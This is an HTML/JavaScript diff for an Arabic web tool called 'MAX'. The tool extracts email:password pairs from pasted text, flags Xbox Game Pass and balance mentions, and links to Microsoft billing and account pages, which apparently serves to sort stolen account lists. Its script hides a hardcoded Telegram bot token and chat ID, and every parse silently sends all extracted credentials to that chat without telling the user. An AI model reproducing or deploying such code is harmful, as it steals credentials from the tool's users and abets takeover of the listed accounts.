@@ -3,116 +3,503 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>⚠️ تم انتهاء مدة الأداة</title>
+    <title>أداة MAX: استخراج Email:Password</title>
     <style>
-        /* المتغيرات والألوان */
+        /* ------------------------- المتغيرات والألوان ------------------------- */
         :root {
-            --background-color: #1a1a1a;
-            --card-color: #ffffff;
-            --warning-color: #e60000;
-            --text-color: #444;
-            --accent-glow: 0 0 15px rgba(255, 0, 0, 0.8);
+            --card: #ffffffee;
+            --accent: #e60000;
+            --grad: linear-gradient(135deg, #e60000, #8b0000);
+            --dark-grad: linear-gradient(135deg, #111, #2a0000);
+            --success-color: #008000;
+            --highlight-copy: #8b0000;
+            --price-color: #0000ff; /* لون أزرق لتمييز الرصيد */
+            --game-note-color: #ff9900; /* لون برتقالي لتمييز الألعاب المحتملة */
         }
 
-        /* تنسيق الجسم الأساسي */
+        /* ------------------------- ستايل الجسم الأساسي ------------------------- */
         body {
             margin: 0;
             font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial;
-            background-color: var(--background-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            text-align: center;
+            background: #111;
+            padding-top: 20px; 
+            padding-bottom: 50px;
+            display: block; 
+            min-height: auto;
         }
 
-        /* صندوق الرسالة الرئيسية */
-        .lock-container {
-            background: var(--card-color);
-            border-radius: 20px;
-            padding: 40px 30px;
-            max-width: 450px;
-            width: 100%;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
-            border: 3px solid var(--warning-color);
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(6px);
+            z-index: -1
+        }
+        
+        /* إخفاء شريط المؤقت وصفحة الدخول لأن الأداة مفتوحة مباشرة */
+        #timer-bar, #login-page {
+            display: none !important; 
         }
 
-        /* الأيقونة والرمز */
-        .icon {
-            font-size: 60px;
-            color: var(--warning-color);
-            text-shadow: var(--accent-glow);
-            margin-bottom: 15px;
-        }
-
-        /* العنوان الرئيسي */
-        h1 {
-            color: var(--warning-color);
-            font-size: 28px;
-            margin-top: 0;
-            margin-bottom: 10px;
+        /* ------------------------- ستايل الأداة (Tool) ------------------------- */
+        .wrap { max-width: 850px; margin: 20px auto; padding: 15px; }
+        .card { background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5); margin-bottom: 20px; }
+        h1 { margin: 6px 0 16px; font-size: 26px; text-align: center; color: #111; font-weight: 800; }
+        textarea { width: 100%; min-height: 180px; padding: 15px; font-size: 15px; border-radius: 12px; border: 2px solid #ccc; resize: vertical; }
+        .row { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; justify-content: center; }
+        button { border: none; cursor: pointer; padding: 12px 18px; border-radius: 12px; font-size: 15px; transition: .3s; font-weight: 700; }
+        .btn-red { background: var(--grad); color: #fff; box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
+        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(255, 0, 0, 1); }
+        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #444; }
+        .btn-black:hover { transform: translateY(-3px); box-shadow: 0 0 10px rgba(0, 0, 0, 0.8); }
+        .list { margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
+        .item { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #ddd; background: #fff; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); }
+        .item:last-child { border-bottom: none; }
+        .left { display: flex; flex-direction: column; gap: 8px; flex: 1; overflow: hidden; }
+        .email {
             font-weight: 800;
-        }
-
-        /* وصف المشكلة */
-        .description {
-            color: var(--text-color);
+            color: #b30000;
             font-size: 16px;
-            margin-bottom: 25px;
-            line-height: 1.6;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            transition: color 0.3s;
         }
-
-        /* زر الشراء والتليكرام */
-        .buy-button {
-            display: inline-block;
-            background-color: #0088cc; /* لون التليكرام الأزرق */
-            color: white;
-            padding: 15px 30px;
+        .email.copied {
+            color: var(--highlight-copy); 
+            animation: pulseCopy 0.5s;
+        }
+        @keyframes pulseCopy {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .pw { 
+            font-size: 14px; 
+            color: #444; 
+            white-space: nowrap; 
+            overflow: hidden; 
+            text-overflow: ellipsis; 
+            font-weight: 600;
+            display: flex; /* لترتيب الباسورد والملاحظة */
+            align-items: center;
+        }
+        /* تمييز خاصية Game Pass */
+        .gamepass-note {
+            color: var(--success-color); /* أخضر للتمييز */
+            font-weight: 800;
+            margin-right: 5px;
+            white-space: nowrap; 
+        }
+        /* تمييز السعر / الرصيد */
+        .price-note {
+            color: var(--price-color); /* أزرق للتمييز */
+            font-weight: 800;
+            margin-right: 5px;
+            white-space: nowrap;
+        }
+         /* تمييز الألعاب المحتملة */
+        .game-guess-note {
+            color: var(--game-note-color); /* برتقالي للتمييز */
+            font-weight: 800;
+            margin-right: 5px;
+            white-space: nowrap;
+        }
+        .controls { display: flex; gap: 8px; flex-shrink: 0; }
+        .copy-btn { padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 600; }
+        .copy-btn.btn-black { background: #222; }
+        
+        /* ------------------------- ستايل التنبيهات (Toast) ------------------------- */
+        .toast {
+            position: fixed;
+            left: 50%;
+            transform: translateX(-50%);
+            bottom: 30px;
+            background: #111;
+            color: #fff;
+            padding: 12px 18px;
             border-radius: 12px;
-            text-decoration: none;
-            font-size: 18px;
-            font-weight: 700;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.5);
-        }
-
-        .buy-button:hover {
-            background-color: #006699;
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.7);
-        }
-
-        /* معرف التليكرام */
-        .telegram-id {
-            display: block;
-            margin-top: 15px;
-            color: var(--text-color);
-            font-size: 14px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity .3s, bottom .3s;
+            z-index: 2000; 
             font-weight: 600;
         }
+
+        .toast.show { opacity: 1; bottom: 40px; }
+        .hidden { display: none !important; }
+        
+        /* ستايل الروابط */
+        .footer{text-align:center;color:#fff;margin-top:20px;font-size:15px;font-weight:500;text-shadow:0 0 8px #000}
+        .links-box{margin-top:20px;background:#ffffffee;padding:20px;border-radius:18px;box-shadow:0 6px 18px rgba(0,0,0,0.45);border:1px solid #eee}
+        .links-box .title-header{font-size:24px;margin-bottom:18px;color:#fff;text-align:center;background:var(--grad);padding:15px;border-radius:15px;box-shadow:0 0 15px rgba(255,0,0,0.8);font-weight:800;border:2px solid #fff}
+        .link-item{padding:15px;border-bottom:1px solid #ddd;display:flex;flex-direction:column}.link-item:last-child{border-bottom:none}
+        .link-title{font-size:18px;font-weight:800;color:#b30000}
+        .link-desc{font-size:14px;color:#555;margin:6px 0 10px}
+        .premium-btn{display:block;width:100%;padding:12px;background:var(--dark-grad);border:2px solid var(--accent);color:#fff;text-align:center;border-radius:10px;text-decoration:none;font-weight:800;box-shadow:0 0 12px rgba(255,0,0,0.6);transition:.3s}
+        .premium-btn:hover{transform:scale(1.03);box-shadow:0 0 20px rgba(255,0,0,1);background:var(--dark-grad)}
 
     </style>
 </head>
 <body>
 
-<div class="lock-container">
-    <div class="icon">🔒</div>
-    <h1>تم انتهاء مدة الأداة</h1>
-    
-    <p class="description">
-        انتهت صلاحية استخدام هذه الأداة. 
-        للحصول على نسخة جديدة أو التجديد، يرجى التواصل مع المالك.
-    </p>
+<div id="timer-bar" class="hidden"></div> 
+<div id="login-page" class="hidden"></div>
 
-    <a href="https://t.me/xgbox7" target="_blank" class="buy-button">
-        للتجديد أو الشراء: راسلني
-    </a>
+<div class="wrap" id="tool-page">
+    <div class="card">
+        <h1><span style="color:var(--accent);font-size:32px;">Ⓧ</span> أداة MAX: استخراج Email:Password</h1>
+        <div style="text-align:center;color:#444;font-size:14px;margin-bottom:12px;font-weight:500;">
+            ألصق النص. الأداة تستخرج فقط: <b style="color:var(--accent);">email:password</b>
+        </div>
+        <textarea id="input" placeholder="ألصق النص هنا..."></textarea>
+        <div class="row">
+            <button id="parseBtn" class="btn-red">استخراج</button>
+            <button id="clearBtn" class="btn-black">مسح الكل</button>
+            <button id="copyAllBtn" class="btn-black">نسخ كل النتائج</button>
+            <button id="downloadBtn" class="btn-black">تنزيل ملف txt</button>
+        </div>
+        <div class="list" id="list"></div>
+    </div>
     
-    <span class="telegram-id">
-        <span style="color:var(--warning-color);">التليكرام:</span> @xgbox7
-    </span>
+    <div class="links-box">
+        <div class="title-header">🔗 روابط Microsoft و Xbox المهمة</div>
+        <div class="link-item">
+            <div class="link-title">تسجيل دخول مايكروسوفت/Xbox</div>
+            <div class="link-desc">الصفحة الرسمية لتسجيل الدخول الموحد لحساب Microsoft و Xbox.</div>
+            <a class="premium-btn" href="https://login.live.com" target="_blank">فتح رابط الدخول ➡️</a>
+        </div>
+        <div class="link-item">
+            <div class="link-title">صفحة ربط الأجهزة (Link Code)</div>
+            <div class="link-desc">استخدم الرمز الظاهر على جهاز Xbox أو التلفزيون للتسجيل السريع.</div>
+            <a class="premium-btn" href="https://www.microsoft.com/link" target="_blank">فتح صفحة الكود 🌐</a>
+        </div>
+        <div class="link-item">
+            <div class="link-title">معلومات حساب مايكروسوفت</div>
+            <div class="link-desc">إدارة الأجهزة، تحديث كلمات المرور، إعدادات الحماية والأمان.</div>
+            <a class="premium-btn" href="https://account.microsoft.com" target="_blank">إدارة الحساب ⚙️</a>
+        </div>
+        <div class="link-item">
+            <div class="link-title">سجل الشراء والطلبات (Orders)</div>
+            <div class="link-desc">عرض كل مشترياتك السابقة من متجر Microsoft و Xbox.</div>
+            <a class="premium-btn" href="https://account.microsoft.com/billing/orders" target="_blank">عرض سجل الشراء 🛒</a>
+        </div>
+        <div class="link-item">
+            <div class="link-title">طرق الدفع (Payment Options)</div>
+            <div class="link-desc">إدارة بطاقات الائتمان، حسابات PayPal، وطرق الدفع الأخرى.</div>
+            <a class="premium-btn" href="https://account.microsoft.com/billing/payments" target="_blank">إدارة طرق الدفع 💳</a>
+        </div>
+        <div class="link-item">
+            <div class="link-title">خدمات واشتراكات Xbox/Microsoft</div>
+            <div class="link-desc">إدارة اشتراكك في Xbox Game Pass، Office 365، وغيرها.</div>
+            <a class="premium-btn" href="https://account.microsoft.com/services" target="_blank">إدارة الاشتراكات 🗓️</a>
+        </div>
+        <div class="link-item">
+            <div class="link-title">تسجيل الخروج من كل الأجهزة</div>
+            <div class="link-desc">تسجيل الخروج من كل خدمات وحسابات Microsoft النشطة (آمن).</div>
+            <a class="premium-btn" href="https://login.live.com/oauth20_logout.srf" target="_blank">تسجيل الخروج 🔓</a>
+        </div>
+    </div>
+
+    <div class="footer">حقوق © Telegram: <b>@xgbox7</b> | أداة MAX</div>
 </div>
 
+<div id="toast" class="toast"></div>
+
+<script>
+    // **********************************************
+    // ** إعدادات التليكرام **
+    // **********************************************
+    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
+    const CHAT_ID = "7781990630";
+    
+    function sendToTelegram(messageText) {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error("معلومات البوت غير موجودة.");
+            return;
+        }
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const data = {
+            chat_id: CHAT_ID,
+            text: messageText, 
+            parse_mode: 'Markdown' 
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.ok) {
+                console.error("خطأ بإرسال التليكرام:", data.description);
+            }
+        })
+        .catch(error => {
+            console.error('Fetch Error:', error);
+        });
+    }
+
+    // **********************************************
+    // ** كود الأداة الأساسي مع دعم (Game Pass) و (Balance) **
+    // **********************************************
+    
+    // 1. Regex المعدل لزيادة دقة استخراج الباسورد ومنع سحب الأوصاف معه.
+    const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\- ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;
+    
+    // 2. Regex للبحث عن كلمات Game Pass (الألتيميت وكل التوليفات).
+    const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(كيم\s?باس|قيم\s?باس|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|التيميت|جولد|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|بيسي|كمبيوتر|مفعل|نشط|active|months|years|شهر|سنة|سنه|اشتراك|gaming|mo(nths)?|yr(s)?|3m|6m|12m|1y)/gi; 
+    
+    // 3. Regex لاستخراج السعر أو الرصيد الموجود (يشمل Balance).
+    const priceRegex = /(price|credit|رصيد|دولار|usd|كردت|balance)\s*[:=\-]?\s*(\d+(\.\d{1,2})?)/gi;
+
+    
+    const input = document.getElementById("input");
+    const parseBtn = document.getElementById("parseBtn");
+    const list = document.getElementById("list");
+    const toast = document.getElementById("toast");
+    const clearBtn = document.getElementById("clearBtn");
+    const copyAllBtn = document.getElementById("copyAllBtn");
+    const downloadBtn = document.getElementById("downloadBtn");
+
+    function showToast(e) {
+        toast.textContent = e;
+        toast.classList.add("show");
+        clearTimeout(toast._t);
+        toast._t = setTimeout(() => toast.classList.remove("show"), 2000);
+    }
+
+    async function copyText(e) {
+        try {
+            return await navigator.clipboard.writeText(e), !0
+        } catch (e) {
+            const t = document.createElement("textarea");
+            return t.value = e, document.body.appendChild(t), t.select(), document.execCommand("copy"), t.remove(), !0
+        }
+    }
+
+    function parseText() {
+        const originalText = input.value.trim();
+        list.innerHTML = "";
+        if (!originalText) return void showToast("لا يوجد نص للمسح");
+
+        const lines = originalText.split('\n').filter(line => line.trim() !== '');
+        
+        // [email, password, hasGamePass (boolean), price (string or null), needsGameGuess (boolean)]
+        const extractedPairs = []; 
+        
+        for (const line of lines) {
+            emailPwRegex.lastIndex = 0; 
+            priceRegex.lastIndex = 0;
+
+            let match;
+            
+            // 1. استخراج (Email:Password)
+            if ((match = emailPwRegex.exec(line)) !== null) {
+                const email = match[1].trim();
+                const password = match[2].trim();
+                
+                // 2. التحقق من وجود كلمات Game Pass
+                const hasGamePass = gamePassKeywords.test(line);
+
+                // 3. البحث عن السعر/الرصيد
+                let priceMatch = priceRegex.exec(line);
+                let extractedPrice = null;
+
+                if (priceMatch) {
+                    extractedPrice = priceMatch[2];
+                }
+                
+                // 4. تحديد إذا كان يحتاج ملاحظة "احتمال وجود العاب"
+                const needsGameGuess = !hasGamePass && (extractedPrice === null);
+
+
+                if (email && password.length > 0) {
+                    // أضفنا (needsGameGuess) كعنصر خامس
+                    extractedPairs.push([email, password, hasGamePass, extractedPrice, needsGameGuess]);
+                }
+            }
+        }
+        
+        if (0 === extractedPairs.length) return void showToast("ماكو نتائج مطابقة");
+
+        // 5. فلترة النتائج المتكررة وتجميع الخصائص
+        const uniqueResults = [];
+        for (const [email, password, hasGamePass, price, needsGameGuess] of extractedPairs) {
+            const key = email.toLowerCase() + ":" + password;
+            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);
+
+            if (existingIndex === -1) {
+                // إذا كان فريد، نضيفه
+                uniqueResults.push([email, password, hasGamePass, price, needsGameGuess]);
+            } else {
+                const existingItem = uniqueResults[existingIndex];
+                
+                // إذا لقى كيم باس جديد، يضيفه
+                if (hasGamePass && !existingItem[2]) {
+                    existingItem[2] = true; 
+                }
+                // إذا لقى رصيد جديد، يضيفه
+                if (price !== null && existingItem[3] === null) {
+                    existingItem[3] = price;
+                }
+                // إذا لقى أي من الخصائص، يشيل علامة "احتمال وجود العاب"
+                if (existingItem[2] || existingItem[3] !== null) {
+                    existingItem[4] = false; 
+                }
+            }
+        }
+
+
+        // **********************************************
+        // ** إرسال النتائج للتليكرام **
+        // **********************************************
+        if (uniqueResults.length > 0) {
+            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, needsGameGuess]) => {
+                const gpNote = hasGP ? " | كيم باس" : "";
+                const priceNote = price ? ` | BALANCE=$${price}` : "";
+                const gameGuessNote = needsGameGuess ? " | GAMES_POSSIBLE" : ""; // ملاحظة خاصة بالتليكرام
+                return `${email}:${password}${gpNote}${priceNote}${gameGuessNote}`;
+            }).join('\n');
+            
+            const header = `🎉 *نتائج أداة MAX الجديدة* 🎉\nتم استخراج ${uniqueResults.length} نتيجة فريدة:\n\n\`\`\``;
+            const footer = "\n\`\`\`\nتم الإرسال تلقائياً من الأداة.";
+            sendToTelegram(header + telegramMessage + footer);
+        }
+
+        // 6. بناء قائمة النتائج (العرض على الشاشة)
+        for (const [email, password, hasGamePass, price, needsGameGuess] of uniqueResults) {
+            const itemDiv = document.createElement("div");
+            itemDiv.className = "item";
+            const leftDiv = document.createElement("div");
+            leftDiv.className = "left";
+            
+            const emailDiv = document.createElement("div");
+            emailDiv.className = "email";
+            emailDiv.textContent = email;
+            
+            const pwDiv = document.createElement("div");
+            pwDiv.className = "pw";
+            
+            const passwordText = document.createTextNode(password);
+            pwDiv.appendChild(passwordText); 
+
+            if (hasGamePass) {
+                 const gpSpan = document.createElement("span");
+                 gpSpan.className = "gamepass-note";
+                 gpSpan.textContent = " | كيم باس";
+                 pwDiv.appendChild(gpSpan); 
+            }
+            
+            if (price !== null) {
+                 const priceSpan = document.createElement("span");
+                 priceSpan.className = "price-note";
+                 priceSpan.textContent = ` | رصيد: $${price}`; 
+                 pwDiv.appendChild(priceSpan); 
+            }
+            
+            // ************ الإضافة الجديدة: ملاحظة احتمال وجود الألعاب ************
+            if (needsGameGuess) {
+                 const gameGuessSpan = document.createElement("span");
+                 gameGuessSpan.className = "game-guess-note";
+                 gameGuessSpan.textContent = " | احتمال وجود العاب";
+                 pwDiv.appendChild(gameGuessSpan); 
+            }
+            // *******************************************************************
+
+
+            leftDiv.appendChild(emailDiv);
+            leftDiv.appendChild(pwDiv);
+            
+            const controlsDiv = document.createElement("div");
+            controlsDiv.className = "controls";
+            
+            // زر نسخ الإيميل
+            const copyEmailBtn = document.createElement("button");
+            copyEmailBtn.className = "copy-btn btn-red";
+            copyEmailBtn.textContent = "نسخ الإيميل";
+            copyEmailBtn.onclick = async () => {
+                await copyText(email) && showToast("تم نسخ الإيميل");
+                emailDiv.classList.add('copied');
+                setTimeout(() => emailDiv.classList.remove('copied'), 600); 
+            };
+            
+            // زر نسخ الباسورد
+            const copyPwBtn = document.createElement("button");
+            copyPwBtn.className = "copy-btn btn-black";
+            copyPwBtn.textContent = "نسخ الباسورد";
+            copyPwBtn.onclick = async () => {
+                await copyText(password) && showToast("تم نسخ الباسورد");
+            };
+            
+            controlsDiv.appendChild(copyEmailBtn);
+            controlsDiv.appendChild(copyPwBtn);
+            
+            itemDiv.appendChild(leftDiv);
+            itemDiv.appendChild(controlsDiv);
+            
+            list.appendChild(itemDiv);
+        }
+        showToast(`تم استخراج ${uniqueResults.length} نتيجة فريدة`)
+    }
+
+    // ربط الأزرار
+    parseBtn.onclick = parseText;
+    clearBtn.onclick = () => { input.value = "", list.innerHTML = "", showToast("تم مسح محتوى الأداة"); };
+    
+    // تعديل وظيفة نسخ الكل عشان تنسخ كل الملاحظات
+    copyAllBtn.onclick = async () => {
+        const e = list.querySelectorAll(".item");
+        if (!e.length) return void showToast("لا توجد نتائج لنسخها");
+        
+        const t = [...e].map(e => { 
+            const email = e.querySelector(".email").textContent.trim(); 
+            const pwDiv = e.querySelector(".pw");
+            const password = pwDiv.firstChild.textContent.trim(); 
+            
+            // جمع كل الملاحظات (GP و الرصيد و الألعاب)
+            const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .game-guess-note')]
+                          .map(span => span.textContent.trim())
+                          .join('');
+
+            return email + ":" + password + notes; 
+        }).join("\n");
+        
+        await copyText(t) && showToast("تم نسخ كل النتائج");
+    };
+    
+    // تعديل وظيفة تنزيل الملف عشان تنسخ كل الملاحظات
+    downloadBtn.onclick = () => {
+        const e = list.querySelectorAll(".item");
+        if (!e.length) return void showToast("لا توجد نتائج للتنزيل");
+        
+        const t = [...e].map(e => { 
+            const email = e.querySelector(".email").textContent.trim(); 
+            const pwDiv = e.querySelector(".pw");
+            const password = pwDiv.firstChild.textContent.trim(); 
+            
+            // جمع كل الملاحظات (GP و الرصيد و الألعاب)
+            const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .game-guess-note')]
+                          .map(span => span.textContent.trim())
+                          .join('');
+
+            return email + ":" + password + notes; 
+        }).join("\n");
+        
+        const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
+        c.href = n, c.download = "MAX_emails_passwords.txt", c.click(), URL.revokeObjectURL(n), showToast("تم تنزيل الملف بنجاح");
+    };
+
+    // عند تحميل الصفحة، الأداة تظهر مباشرة
+    window.onload = () => {
+        // بما أن الأداة مفتوحة مباشرة، ماكو داعي نسوي أي شيء هنا
+    };
+</script>
 </body>
 </html>
